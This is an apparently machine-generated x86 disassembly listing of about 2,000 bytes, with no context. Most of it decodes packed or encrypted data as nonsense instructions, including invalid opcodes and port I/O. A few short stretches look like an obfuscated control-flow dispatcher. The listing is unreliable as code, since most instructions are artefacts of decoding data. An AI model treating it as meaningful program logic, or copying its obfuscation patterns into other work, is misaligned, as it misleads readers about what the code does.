  409d96:	mov    eax,ds:0x4865d182
  409d9b:	daa    
  409d9c:	arpl   WORD PTR [ecx+ebp*1-0x7e1de112],bx
  409da3:	push   edi
  409da4:	retf   0x1cc3
  409da7:	lods   eax,DWORD PTR ds:[esi]
  409da8:	rcr    DWORD PTR [edi-0x60],1
  409dab:	dec    esi
  409dac:	xchg   ebx,eax
  409dad:	in     al,0x5c
  409daf:	aaa    
  409db0:	test   al,0x38
  409db2:	sub    dh,dh
  409db4:	jecxz  0x409de8
  409db6:	rcl    ecx,1
  409db8:	xchg   ecx,eax
  409db9:	add    bh,bl
  409dbb:	mov    bl,0xde
  409dbd:	call   0x33a21fde
  409dc2:	in     eax,0x2c
  409dc4:	xor    eax,0x9f7231d1
  409dc9:	test   DWORD PTR [edi+0x5cc298cb],esp
  409dcf:	arpl   dx,sp
  409dd1:	pop    DWORD PTR [edx+0x77]
  409dd4:	inc    edi
  409dd5:	jl     0x409d94
  409dd7:	(bad)  
  409dd8:	lahf   
  409dd9:	aam    0xf6
  409ddb:	push   esp
  409ddc:	add    BYTE PTR [ebx+0x68],al
  409ddf:	fsub   st,st(3)
  409de1:	mov    esp,0xa5e25ada
  409de6:	pop    esi
  409de7:	and    BYTE PTR [edx+0x1942e707],0x2c
  409dee:	pop    esp
  409def:	fisub  DWORD PTR [esi+0x33d6399a]
  409df5:	push   0x72
  409df7:	jnp    0x409dd3
  409df9:	in     eax,dx
  409dfa:	add    ch,BYTE PTR [ebp+0x6dbbade]
  409e00:	iret   
  409e01:	dec    eax
  409e02:	inc    edi
  409e03:	bnd jae 0x409dd7
  409e06:	fdivr  QWORD PTR [eax]
  409e08:	fnop   
  409e0a:	mov    esp,0x69d1fa0a
  409e0f:	sub    eax,0xd742e6a7
  409e14:	in     al,0x42
  409e16:	cmp    esp,DWORD PTR [esi]
  409e18:	cld    
  409e19:	(bad)  
  409e1b:	or     eax,0xd76b2a3c
  409e20:	std    
  409e21:	je     0x409da3
  409e23:	adc    eax,0x38271381
  409e28:	sbb    bh,BYTE PTR [esi+ecx*1]
  409e2b:	clc    
  409e2c:	repz adc DWORD PTR [ebx+esi*8+0x42],esi
  409e31:	retf   0x8f54
  409e34:	xchg   ecx,eax
  409e35:	jmp    0x409e94
  409e37:	mov    eax,ds:0x6a1f7805
  409e3c:	mov    al,ds:0xc0c8ce95
  409e41:	das    
  409e42:	fwait
  409e43:	pop    ebp
  409e44:	fidiv  DWORD PTR [ebx+0x608f3eb8]
  409e4a:	inc    esi
  409e4b:	sub    ch,BYTE PTR [esi-0x1a]
  409e4e:	arpl   WORD PTR [edx+0x4c],ax
  409e51:	popa   
  409e52:	adc    DWORD PTR [edi-0x68],0x32
  409e56:	mov    edx,0xa335eb99
  409e5b:	nop
  409e5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e5d:	cmp    al,0xba
  409e5f:	call   0x30210754
  409e64:	dec    eax
  409e65:	and    BYTE PTR [ebp+0xb],bl
  409e68:	sub    BYTE PTR [eax-0xde3402],bh
  409e6e:	sbb    eax,0x287d7c1a
  409e73:	test   BYTE PTR [esp+ebp*4+0x129757bb],bl
  409e7a:	mov    cl,0xe4
  409e7c:	mov    DWORD PTR [ebx+0x56],esi
  409e7f:	popf   
  409e80:	shl    DWORD PTR [ecx+0x6b19a831],0x9
  409e87:	sbb    al,0x58
  409e89:	pop    ds
  409e8a:	bound  eax,QWORD PTR [eax+0x1f301ba8]
  409e90:	daa    
  409e91:	pop    ecx
  409e92:	mov    cl,0xce
  409e94:	pop    ds
  409e95:	pop    ecx
  409e96:	jbe    0x409e78
  409e98:	cmp    eax,0x7fb82801
  409e9d:	add    eax,0x3c8fd62b
  409ea2:	jl     0x409f17
  409ea4:	ds jns 0x409e31
  409ea7:	fild   WORD PTR [eax+0x3f9c223d]
  409ead:	mov    ah,0x0
  409eaf:	(bad)  
  409eb0:	addr16 mov eax,ds:0xf52d
  409eb4:	(bad)  
  409eb5:	aad    0x6c
  409eb7:	repnz and dl,BYTE PTR [esi]
  409eba:	dec    ebx
  409ebb:	mov    eax,0x44cb648c
  409ec0:	mov    ah,0x46
  409ec2:	and    cl,dl
  409ec4:	jg     0x409ee3
  409ec6:	xor    al,0x7f
  409ec8:	fnstenv [esi-0xb]
  409ecb:	push   ecx
  409ecc:	or     eax,DWORD PTR [eax]
  409ece:	and    al,0xfe
  409ed0:	add    eax,0x7591a1ba
  409ed5:	stc    
  409ed6:	xor    dh,BYTE PTR [esi+0x3c50f752]
  409edc:	fcomip st,st(1)
  409ede:	xor    ah,BYTE PTR [eax+esi*4-0x3a]
  409ee2:	or     eax,0x40da3675
  409ee7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ee8:	imul   ebx,eax,0xffffff87
  409eeb:	lods   al,BYTE PTR ds:[esi]
  409eec:	xchg   edi,eax
  409eed:	pop    esp
  409eee:	jl     0x409ebc
  409ef0:	mov    eax,0x50af2ab0
  409ef5:	push   0xe48307ca
  409efa:	aad    0xaf
  409efc:	test   DWORD PTR [edx+ebp*1],0xc5664eaf
  409f03:	sub    BYTE PTR [ebx+0x25],0x0
  409f07:	or     ecx,ebx
  409f09:	ins    BYTE PTR es:[edi],dx
  409f0a:	cmp    bl,ah
  409f0c:	iret   
  409f0d:	dec    esp
  409f0e:	jl     0x409f52
  409f10:	out    dx,al
  409f11:	and    eax,0xcc300a14
  409f16:	xchg   esp,eax
  409f17:	push   ds
  409f18:	cmp    al,0x3b
  409f1a:	daa    
  409f1b:	adc    al,0x2c
  409f1d:	outs   dx,BYTE PTR ds:[esi]
  409f1e:	jl     0x409f55
  409f20:	push   ebx
  409f21:	fstp   QWORD PTR [edx]
  409f23:	imul   ebp,DWORD PTR [esi],0x42
  409f26:	mov    ebx,0x6093b6b3
  409f2b:	mov    bh,0x51
  409f2d:	adc    al,0xc0
  409f2f:	xchg   esi,eax
  409f30:	xchg   edi,eax
  409f31:	repnz addr16 (bad)
  409f35:	shl    DWORD PTR [esi+ebx*2+0x27],cl
  409f39:	popf   
  409f3a:	pop    DWORD PTR [ecx+0x6db50068]
  409f40:	mov    al,ds:0x8ae71976
  409f45:	xchg   ecx,eax
  409f46:	xor    al,0x32
  409f48:	mov    dl,0x2a
  409f4a:	pop    ss
  409f4b:	and    ah,BYTE PTR [esi]
  409f4d:	mov    eax,0xa2ce9341
  409f52:	pop    edx
  409f53:	stos   DWORD PTR es:[edi],eax
  409f54:	cmp    al,0xe1
  409f56:	push   0x248b5a14
  409f5b:	in     eax,0x5
  409f5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f5e:	xchg   esp,eax
  409f5f:	sti    
  409f60:	xchg   edx,eax
  409f61:	ror    bh,0xe4
  409f64:	std    
  409f65:	cmp    BYTE PTR ds:0xd6cfad1f,dh
  409f6b:	popa   
  409f6c:	pop    esp
  409f6d:	outs   dx,BYTE PTR ds:[esi]
  409f6e:	(bad)  
  409f6f:	adc    DWORD PTR [ecx],ebp
  409f71:	jb     0x409f59
  409f73:	mov    ebx,0xf55b64c6
  409f78:	sub    eax,0x1025e6d2
  409f7d:	and    esp,DWORD PTR [ebx+0x6f]
  409f80:	mov    ds:0x2d442df5,eax
  409f85:	ins    DWORD PTR es:[edi],dx
  409f86:	mov    edi,gs
  409f88:	dec    BYTE PTR [edx]
  409f8a:	jmp    0x9448e688
  409f8f:	jecxz  0x40a005
  409f91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f92:	data16 cmp BYTE PTR [eax-0x3d],dl
  409f96:	xor    al,0x93
  409f98:	sbb    esi,DWORD PTR [ecx+ecx*1+0x62]
  409f9c:	fnstenv ds:0x11708200
  409fa2:	jno    0x409f74
  409fa4:	bound  edx,QWORD PTR [ebx+0x49]
  409fa7:	or     DWORD PTR [edi+0x7f581b82],esi
  409fad:	inc    edi
  409fae:	sub    bh,bh
  409fb0:	dec    ebx
  409fb1:	into   
  409fb2:	pop    esp
  409fb3:	popf   
  409fb4:	dec    ebx
  409fb5:	icebp  
  409fb6:	cwde   
  409fb7:	xchg   BYTE PTR [esi+0x5f2584a2],dl
  409fbd:	fild   QWORD PTR [edx+esi*1]
  409fc0:	(bad)  
  409fc2:	shrd   ecx,ecx,cl
  409fc5:	push   0xffffff8e
  409fc7:	cli    
  409fc8:	shl    DWORD PTR ds:0x73b55b12,cl
  409fce:	ja     0x409f95
  409fd0:	mov    ebp,0x3a640fd0
  409fd5:	in     eax,0xfa
  409fd7:	aad    0xdd
  409fd9:	add    edi,DWORD PTR [edi]
  409fdb:	pop    edi
  409fdc:	xchg   esp,eax
  409fdd:	mov    eax,DWORD PTR [esi]
  409fdf:	xor    eax,0xec2c0d0e
  409fe4:	jno    0x40a052
  409fe6:	jl     0x409fc6
  409fe8:	out    0x4b,al
  409fea:	or     al,0xa2
  409fec:	sti    
  409fed:	cmc    
  409fee:	mul    DWORD PTR [eax]
  409ff0:	repz sbb al,0x53
  409ff3:	inc    esp
  409ff4:	adc    eax,0xc5770eb
  409ff9:	shr    bl,1
  409ffb:	sti    
  409ffc:	lock test ebp,esp
  409fff:	or     eax,DWORD PTR [edx+0x753ba447]
  40a005:	leave  
  40a006:	adc    al,0x63
  40a008:	sub    al,0x8b
  40a00a:	dec    ebp
  40a00b:	lock xor eax,esi
  40a00e:	add    eax,edi
  40a010:	mov    DWORD PTR [ecx],eax
  40a012:	mov    eax,DWORD PTR [ebp-0x10]
  40a015:	mov    ecx,DWORD PTR [ebp+0x10]
  40a018:	jmp    0x40a339
  40a01d:	enter  0xca7a,0x5
  40a021:	enter  0xd1d5,0xd3
  40a025:	sbb    esi,esp
  40a027:	mul    DWORD PTR [ebx-0x7]
  40a02a:	loopne 0x40a00e
  40a02c:	add    DWORD PTR [eax-0x12],esi
  40a02f:	jle    0x40a0af
  40a031:	jp     0x40a0b0
  40a033:	jle    0x40a0b3
  40a035:	pushf  
  40a036:	rcl    DWORD PTR [esi],1
  40a038:	sti    
  40a039:	adc    BYTE PTR [edx],bl
  40a03b:	lods   eax,DWORD PTR ds:[esi]
  40a03c:	inc    esp
  40a03d:	loop   0x40a0a5
  40a03f:	jbe    0x409fff
  40a041:	repz and ah,BYTE PTR [esi+0x35b90168]
  40a048:	adc    esi,ebx
  40a04a:	mov    WORD PTR [eax-0x518f6119],gs
  40a050:	fstp   QWORD PTR [eax-0x7de621de]
  40a056:	jbe    0x40a01b
  40a058:	pop    ds
  40a059:	push   ebx
  40a05a:	or     edx,0x10361ca4
  40a060:	mov    edi,0x2ebcbd72
  40a065:	mov    bh,bh
  40a067:	stc    
  40a068:	dec    esp
  40a069:	lods   eax,DWORD PTR ds:[esi]
  40a06a:	sub    BYTE PTR [ecx+edx*8],bh
  40a06d:	cmp    eax,0x8002e395
  40a072:	fneni(8087 only) 
  40a074:	ins    DWORD PTR es:[edi],dx
  40a075:	mov    ds:0xcd912f31,eax
  40a07a:	mov    bh,0xd0
  40a07c:	pop    esi
  40a07d:	xchg   ebx,eax
  40a07e:	jp     0x40a09d
  40a080:	xor    eax,0xcd828317
  40a085:	inc    esi
  40a086:	mov    ah,0x8e
  40a088:	mov    ebp,0xc78583fc
  40a08d:	daa    
  40a08e:	pop    ebx
  40a08f:	sbb    esp,DWORD PTR [edx+0x3cb78b1a]
  40a095:	gs sub eax,0xa0290781
  40a09b:	mov    eax,0x73984efd
  40a0a0:	mov    BYTE PTR [ebp+0x17],ah
  40a0a3:	jge    0x40a0ee
  40a0a5:	xchg   ebx,eax
  40a0a6:	push   es
  40a0a7:	leave  
  40a0a8:	loop   0x40a09c
  40a0aa:	shl    bh,0x21
  40a0ad:	into   
  40a0ae:	call   0xcaef:0x8e7815f5
  40a0b5:	adc    al,0x79
  40a0b7:	adc    BYTE PTR [eax+0x30],cl
  40a0ba:	xchg   DWORD PTR [edx],eax
  40a0bc:	jle    0x40a05f
  40a0be:	rcr    BYTE PTR [eax+0x29f57286],cl
  40a0c4:	xor    al,0x44
  40a0c6:	sbb    BYTE PTR [ecx+0xe8e78e4],bl
  40a0cc:	ins    DWORD PTR es:[edi],dx
  40a0cd:	rcr    BYTE PTR [ebx+0x6a],cl
  40a0d0:	rcl    BYTE PTR [ebx-0x60],0x51
  40a0d4:	ret    
  40a0d5:	jne    0x40a093
  40a0d7:	inc    ecx
  40a0d8:	rcl    ecx,0x79
  40a0db:	arpl   WORD PTR cs:[edi],dx
  40a0de:	mov    eax,0x91ca120e
  40a0e3:	push   0xb8af9e7a
  40a0e8:	add    DWORD PTR [ebp-0x30],0x3446dfd4
  40a0ef:	les    edi,FWORD PTR [edi]
  40a0f1:	or     eax,0x3298c94f
  40a0f6:	in     al,dx
  40a0f7:	icebp  
  40a0f8:	nop
  40a0f9:	sub    eax,0x13964a30
  40a0fe:	adc    DWORD PTR [edi],0xae0cec35
  40a104:	push   cs
  40a105:	data16 repz not BYTE PTR [edi+0x9]
  40a10a:	ret    0xb527
  40a10d:	sub    DWORD PTR [esi+eiz*4-0x6b],ebp
  40a111:	or     BYTE PTR [esi+0x52],dl
  40a114:	dec    edi
  40a115:	popf   
  40a116:	inc    esp
  40a117:	daa    
  40a118:	sbb    al,0x1b
  40a11a:	xchg   ebx,eax
  40a11b:	dec    edx
  40a11c:	add    dl,bh
  40a11e:	aas    
  40a11f:	call   0x1b70:0xc0c72019
  40a126:	lea    ecx,ds:0xe316fcbb
  40a12c:	adc    ah,BYTE PTR [esi]
  40a12e:	fnstenv [esi+eiz*1]
  40a131:	mov    bh,0x89
  40a133:	dec    edx
  40a134:	mov    WORD PTR [ebp+0x5f],?
  40a137:	mov    ds:0xcb4562ef,eax
  40a13c:	sbb    DWORD PTR [eax-0x75a40e8a],edx
  40a142:	sbb    ch,BYTE PTR [ebx]
  40a144:	xor    BYTE PTR gs:[edi+0x57],ch
  40a148:	mov    al,0x62
  40a14a:	mov    gs,WORD PTR [edi-0x16]
  40a14d:	xchg   ecx,eax
  40a14e:	loope  0x40a1bc
  40a150:	cwde   
  40a151:	mov    bl,0x2e
  40a153:	push   ecx
  40a154:	sbb    DWORD PTR [esi+0x6d],0xf439fbc4
  40a15b:	clc    
  40a15c:	jne    0x40a110
  40a15e:	mov    ebx,0xfb5321b0
  40a163:	ror    esp,0x97
  40a166:	enter  0xb3e9,0x9f
  40a16a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a16b:	push   edx
  40a16c:	imul   ecx,DWORD PTR [eax+0x791ece36],0x18d4d50d
  40a176:	out    dx,al
  40a177:	loope  0x40a1f7
  40a179:	adc    al,0xd4
  40a17b:	xor    DWORD PTR [edx-0x55315a87],ebx
  40a181:	arpl   ax,sp
  40a183:	xor    ch,BYTE PTR [ebp-0x39]
  40a186:	jge    0x40a15e
  40a188:	out    dx,al
  40a189:	pop    ds
  40a18a:	cs in  al,0x70
  40a18d:	or     DWORD PTR ds:0x58dc4091,ebp
  40a193:	mov    cl,0x9f
  40a195:	sub    DWORD PTR gs:[eax-0x1d],eax
  40a199:	pop    ecx
  40a19a:	pop    eax
  40a19b:	pop    es
  40a19c:	adc    al,0x5c
  40a19e:	arpl   bp,di
  40a1a0:	out    0xbb,eax
  40a1a2:	mov    al,ds:0x8e899862
  40a1a7:	ret    
  40a1a8:	add    ebx,DWORD PTR [eax]
  40a1aa:	in     al,dx
  40a1ab:	mov    eax,ds:0xfe455655
  40a1b0:	mov    ah,0x5e
  40a1b2:	pop    esp
  40a1b3:	es mov edi,0x7da28297
  40a1b9:	push   edi
  40a1ba:	xor    al,0xd8
  40a1bc:	adc    DWORD PTR [eax+0x2c],0x29978fc7
  40a1c3:	aas    
  40a1c4:	aad    0x50
  40a1c6:	fcomp  DWORD PTR [edi+0x5d]
  40a1c9:	push   eax
  40a1ca:	add    eax,DWORD PTR [ebp+0x48]
  40a1cd:	popf   
  40a1ce:	fdivr  DWORD PTR ds:0x210c0e1d
  40a1d4:	jmp    0x40a17b
  40a1d6:	and    BYTE PTR [eax+0x405328fc],ch
  40a1dc:	retf   0x47c1
  40a1df:	xchg   edx,eax
  40a1e0:	sub    eax,ebp
  40a1e2:	pusha  
  40a1e3:	sti    
  40a1e4:	int3   
  40a1e5:	mov    cl,0x68
  40a1e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1e8:	pop    ss
  40a1e9:	call   0xab756737
  40a1ee:	dec    ebx
  40a1ef:	addr16 inc ebx
  40a1f1:	dec    edi
  40a1f2:	lock sub edx,DWORD PTR [edx]
  40a1f5:	in     eax,0x53
  40a1f7:	(bad)  
  40a1f9:	fcmovb st,st(6)
  40a1fb:	mov    WORD PTR [eax+0x24],ds
  40a1fe:	fadd   DWORD PTR [eax]
  40a200:	xchg   esi,eax
  40a201:	(bad)  
  40a202:	nop
  40a203:	sahf   
  40a204:	test   eax,0x7560a1e4
  40a209:	fldenv [ecx-0x4563f66e]
  40a20f:	leave  
  40a210:	push   ebp
  40a211:	loop   0x40a26f
  40a213:	cwde   
  40a214:	push   eax
  40a215:	mov    bh,BYTE PTR [ebx]
  40a217:	pop    ebp
  40a218:	ret    0xd01
  40a21b:	(bad)  
  40a21d:	inc    edi
  40a21e:	jnp    0x40a289
  40a220:	inc    edx
  40a221:	dec    esi
  40a222:	mov    esi,0xad274d7
  40a227:	cmp    ebp,DWORD PTR [ebp-0x3f]
  40a22a:	xchg   ebp,eax
  40a22b:	fldcw  WORD PTR [ecx]
  40a22d:	push   cs
  40a22e:	mov    dh,BYTE PTR [edi]
  40a230:	popf   
  40a231:	(bad)  
  40a232:	mov    edi,DWORD PTR [edi-0x7e]
  40a235:	adc    dh,BYTE PTR [eax+0x5c4b74e4]
  40a23b:	sbb    esp,edx
  40a23d:	adc    al,0x55
  40a23f:	pop    ds
  40a240:	push   ebx
  40a241:	dec    ebx
  40a242:	retf   
  40a243:	pop    eax
  40a244:	inc    ebp
  40a245:	(bad)  
  40a246:	mov    ds:0xac999173,eax
  40a24b:	sbb    edi,DWORD PTR es:[edx+0x699b0352]
  40a252:	jne    0x40a261
  40a254:	adc    eax,0x9ce9ac7e
  40a259:	(bad)  
  40a25a:	ins    DWORD PTR es:[edi],dx
  40a25b:	nop
  40a25c:	jmp    0xa729c868
  40a261:	dec    ecx
  40a262:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a263:	scas   eax,DWORD PTR es:[edi]
  40a264:	ret    0x8ae0
  40a267:	dec    ebp
  40a268:	out    0xfc,eax
  40a26a:	inc    esp
  40a26b:	pop    esi
  40a26c:	push   0x6d280aa3
  40a271:	fwait
  40a272:	aas    
  40a273:	or     DWORD PTR [ebx+ebx*2],esi
  40a276:	push   ebp
  40a277:	loopne 0x40a25f
  40a279:	mov    ebp,0x98d2f94d
  40a27e:	mov    edi,0x9d013d6b
  40a283:	xor    bl,bh
  40a285:	add    esi,DWORD PTR [edi]
  40a287:	mov    al,0x77
  40a289:	xor    eax,0x7e704479
  40a28e:	xor    al,0xfc
  40a290:	add    cl,cl
  40a292:	jecxz  0x40a2f1
  40a294:	ret    0x7e84
  40a297:	popa   
  40a298:	call   0x623a:0x63fc6c10
  40a29f:	dec    ecx
  40a2a0:	rcl    DWORD PTR [esi+0x47361b2d],1
  40a2a6:	xor    bl,bh
  40a2a8:	ja     0x40a2e0
  40a2aa:	jp     0x40a2c3
  40a2ac:	jl     0x40a30f
  40a2ae:	imul   esp,edx,0xfffffff1
  40a2b1:	cld    
  40a2b2:	icebp  
  40a2b3:	popa   
  40a2b4:	ja     0x40a28b
  40a2b6:	mov    al,ds:0x74126be4
  40a2bb:	or     dl,BYTE PTR [eax+ecx*1-0x53cb3863]
  40a2c2:	xchg   esp,eax
  40a2c3:	sbb    BYTE PTR [ecx-0x3e653e18],cl
  40a2c9:	cmc    
  40a2ca:	mov    bh,0xef
  40a2cc:	jae    0x40a2d7
  40a2ce:	jns    0x40a2ec
  40a2d0:	retf   
  40a2d1:	sub    ch,BYTE PTR [edx+0x10]
  40a2d4:	adc    BYTE PTR [eax],al
  40a2d6:	add    al,0x7b
  40a2d8:	repnz gs xchg esi,eax
  40a2db:	or     bl,BYTE PTR [esi+0x4b]
  40a2de:	mov    ah,0x8f
  40a2e0:	gs cdq 
  40a2e2:	xchg   BYTE PTR [ecx+esi*8-0x52],ch
  40a2e6:	pop    ecx
  40a2e7:	or     DWORD PTR [edx+0x5bdb91b4],0x10
  40a2ee:	idiv   esi
  40a2f0:	stc    
  40a2f1:	cmp    bh,al
  40a2f3:	ja     0x40a373
  40a2f5:	ror    BYTE PTR [edx],cl
  40a2f7:	out    dx,al
  40a2f8:	xchg   ecx,eax
  40a2f9:	std    
  40a2fa:	dec    esp
  40a2fb:	pop    edi
  40a2fc:	test   al,0x53
  40a2fe:	mov    dl,0xc7
  40a300:	stos   DWORD PTR es:[edi],eax
  40a301:	mov    esp,0xc8b3eb6d
  40a306:	xchg   ebx,eax
  40a307:	mov    ebx,0x764b1301
  40a30c:	jne    0x40a373
  40a30e:	and    BYTE PTR [ebp+0x8],0xbc
  40a312:	mov    eax,ds:0xf41d2003
  40a317:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a318:	out    0x2e,al
  40a31a:	jle    0x40a38e
  40a31c:	adc    al,0x45
  40a31e:	les    ebx,FWORD PTR [edx+ebp*2]
  40a321:	dec    esi
  40a322:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a323:	jp     0x40a2ab
  40a325:	jge    0x40a36b
  40a327:	pop    edi
  40a328:	jno    0x40a37a
  40a32a:	arpl   WORD PTR [ecx+0x5c],sp
  40a32d:	shl    BYTE PTR [edx],1
  40a32f:	sbb    eax,esi
  40a331:	xchg   ebx,eax
  40a332:	sahf   
  40a333:	jbe    0x40a380
  40a335:	out    0x22,eax
  40a337:	fstp   QWORD PTR [ebx+esi*1]
  40a33a:	into   
  40a33b:	mov    edx,0xffcd8d65
  40a340:	sub    edx,ecx
  40a342:	add    DWORD PTR [eax],edx
  40a344:	mov    eax,ds:0x413cb2
  40a349:	mov    eax,DWORD PTR [eax]
  40a34b:	mov    cx,WORD PTR [ebp-0x4]
  40a34f:	movzx  ecx,cx
  40a352:	add    ecx,DWORD PTR [eax]
  40a354:	mov    DWORD PTR [ebp-0x18],ecx
  40a357:	mov    eax,DWORD PTR [ebp+0xc]
  40a35a:	mov    ecx,DWORD PTR [ebp+0xc]
  40a35d:	xor    eax,esi
  40a35f:	add    eax,eax
  40a361:	xor    ecx,esi
  40a363:	sub    ecx,eax
  40a365:	mov    ax,WORD PTR [ebp-0x4]
  40a369:	movzx  eax,ax
  40a36c:	sub    ecx,edi
  40a36e:	cmp    eax,ecx
  40a370:	mov    eax,DWORD PTR [ebp+0x10]
  40a373:	movzx  ecx,WORD PTR [ebp-0x4]
  40a377:	jg     0x40a38c
  40a37d:	xor    eax,esi
  40a37f:	sub    ecx,eax
  40a381:	sub    ecx,edi
  40a383:	mov    WORD PTR [ebp-0x4],cx
  40a387:	jmp    0x40a399
  40a38c:	xor    eax,esi
  40a38e:	lea    eax,[eax+ecx*1+0x32729b]
  40a395:	mov    WORD PTR [ebp-0x4],ax
  40a399:	mov    eax,DWORD PTR [ebp-0xc]
  40a39c:	cmp    eax,ebx
  40a39e:	je     0x40a3b2
  40a3a4:	mov    eax,DWORD PTR [ebp-0x8]
  40a3a7:	mov    DWORD PTR [eax],0x60341e89
  40a3ad:	jmp    0x40c082
  40a3b2:	mov    eax,DWORD PTR [ebp+0x8]
  40a3b5:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3b8:	xor    eax,esi
  40a3ba:	jmp    0x40a6db
  40a3bf:	retf   0x3136
  40a3c2:	out    dx,al
  40a3c3:	icebp  
  40a3c4:	jmp    0x20e2d69a
  40a3c9:	inc    ebx
  40a3ca:	popf   
  40a3cb:	xchg   esp,eax
  40a3cc:	pop    ss
  40a3cd:	call   0x7a7e:0x7eea7ce2
  40a3d4:	jge    0x40a454
  40a3d6:	jle    0x40a439
  40a3d8:	sbb    al,BYTE PTR [ecx-0x1b]
  40a3db:	cmc    
  40a3dc:	sar    BYTE PTR [esi+eiz*4],cl
  40a3df:	sbb    BYTE PTR [ebx-0x5a],0x24
  40a3e3:	xor    DWORD PTR [di+0x4f64],ecx
  40a3e8:	sub    BYTE PTR [edi],cl
  40a3ea:	cmc    
  40a3eb:	mov    ebx,0xf781fc89
  40a3f0:	pop    edi
  40a3f1:	xchg   ecx,eax
  40a3f2:	push   edi
  40a3f3:	shl    DWORD PTR [edx+0x54c82e04],0xc7
  40a3fa:	push   cs
  40a3fb:	call   0x96d6:0x98a41324
  40a402:	inc    edi
  40a403:	push   cs
  40a404:	or     eax,0x12c84b66
  40a409:	pop    ds
  40a40a:	loop   0x40a3d6
  40a40c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a40d:	into   
  40a40e:	lahf   
  40a40f:	add    esi,esi
  40a411:	test   BYTE PTR [edx-0x4c785e42],bl
  40a417:	cmp    edi,ebx
  40a419:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a41a:	jl     0x40a42d
  40a41c:	nop
  40a41d:	lea    esi,[edx-0x4d]
  40a420:	pushf  
  40a421:	mov    edx,0xa9437c24
  40a426:	push   edx
  40a427:	pushf  
  40a428:	xchg   esp,eax
  40a429:	in     al,dx
  40a42a:	xor    BYTE PTR [eax+0x79],ah
  40a42d:	fs pop edi
  40a42f:	(bad)  
  40a430:	into   
  40a431:	xor    eax,0xecf14d94
  40a436:	jnp    0x40a474
  40a438:	sub    al,0xae
  40a43a:	aam    0x1c
  40a43c:	cmp    eax,0x8cacd08b
  40a441:	or     eax,0xda12468d
  40a446:	cdq    
  40a447:	dec    ebx
  40a448:	faddp  st(7),st
  40a44a:	lds    edx,FWORD PTR [ebp+0x4c]
  40a44d:	shr    BYTE PTR [edx+0x7d],cl
  40a450:	neg    BYTE PTR [ebx+0x7b23f180]
  40a456:	mov    al,ds:0x48a55102
  40a45b:	mov    ebp,0x937a6039
  40a460:	and    eax,0xaaa26ace
  40a465:	mov    cs,WORD PTR [edi]
  40a467:	mov    BYTE PTR [ebx],cl
  40a469:	adc    esi,esp
  40a46b:	lock xchg edi,eax
  40a46d:	fnclex 
  40a46f:	sbb    eax,0x374a79e1
  40a474:	nop
  40a475:	jmp    0x40a4b2
  40a477:	bound  edi,QWORD PTR [ebx-0x22f0aef6]
  40a47d:	xchg   DWORD PTR [ebx+0x5f],esi
  40a480:	in     al,0xff
  40a482:	dec    ebp
  40a483:	inc    eax
  40a484:	fidiv  WORD PTR [eax+0x40]
  40a487:	loope  0x40a4e9
  40a489:	mov    ebx,edx
  40a48b:	ss pop ss
  40a48d:	pop    edi
  40a48e:	mov    edi,0xc6e49a8c
  40a493:	lods   eax,DWORD PTR ds:[esi]
  40a494:	and    al,0x7e
  40a496:	sub    dl,bl
  40a498:	or     al,0x43
  40a49a:	sub    eax,0x288d301b
  40a49f:	push   esp
  40a4a0:	das    
  40a4a1:	dec    edx
  40a4a2:	rcr    DWORD PTR [ebp+0x6b4e153a],cl
  40a4a8:	jae    0x40a521
  40a4aa:	inc    ebp
  40a4ab:	loope  0x40a4cb
  40a4ad:	outs   dx,BYTE PTR ds:[esi]
  40a4ae:	pop    edx
  40a4af:	mov    ds:0x4092db68,ax
  40a4b5:	mov    al,ds:0x53e54c7b
  40a4ba:	jo     0x40a520
  40a4bc:	outs   dx,BYTE PTR ds:[esi]
  40a4bd:	sub    dl,BYTE PTR [esi+0x60]
  40a4c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4c1:	push   0x5c
  40a4c3:	shr    DWORD PTR [esi-0x7eeb592d],cl
  40a4c9:	pushf  
  40a4ca:	mov    ah,0xf3
  40a4cc:	ss scas al,BYTE PTR es:[edi]
  40a4ce:	addr16 or eax,0x6f25ff83
  40a4d4:	xchg   ebx,eax
  40a4d5:	mov    gs,ecx
  40a4d7:	mov    edi,0x4f59f131
  40a4dc:	jne    0x40a51a
  40a4de:	mov    dl,0x5d
  40a4e0:	js     0x40a46b
  40a4e2:	in     al,dx
  40a4e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4e4:	lods   eax,DWORD PTR ds:[esi]
  40a4e5:	imul   ebx,edi,0xb2debe3d
  40a4eb:	and    bh,dh
  40a4ed:	call   0xba501789
  40a4f2:	enter  0xb0ce,0x5d
  40a4f6:	rcl    ebx,cl
  40a4f8:	fisttp WORD PTR [ebp+eiz*1+0x30]
  40a4fc:	dec    edi
  40a4fd:	xor    edx,DWORD PTR [ecx]
  40a4ff:	(bad)  [edi-0x1691ccce]
  40a505:	pop    ds
  40a506:	out    dx,al
  40a507:	bound  edx,QWORD PTR [ecx+0x6c]
  40a50a:	stos   BYTE PTR es:[edi],al
  40a50b:	loope  0x40a544
  40a50d:	std    
  40a50e:	ror    bl,0xcd
  40a511:	push   0x3d73f281
  40a516:	mov    BYTE PTR [edx],0x30
  40a519:	jg     0x40a532
  40a51b:	adc    ah,bh
  40a51d:	ins    DWORD PTR es:[edi],dx
  40a51e:	cwde   
  40a51f:	mul    dh
  40a521:	pop    eax
  40a522:	sti    
  40a523:	xor    eax,0x158b41b2
  40a528:	inc    ecx
  40a529:	xchg   DWORD PTR [ebx],edi
  40a52b:	dec    ebx
  40a52c:	cmp    DWORD PTR [edi],ecx
  40a52e:	in     al,0x95
  40a530:	push   0xffffffdb
  40a532:	mov    al,0xc0
  40a534:	mov    DWORD PTR [edi],esi
  40a536:	(bad)  
  40a537:	jl     0x40a4de
  40a539:	adc    cl,BYTE PTR [ebx+0x407ea5b4]
  40a53f:	pop    ebx
  40a540:	ins    BYTE PTR es:[edi],dx
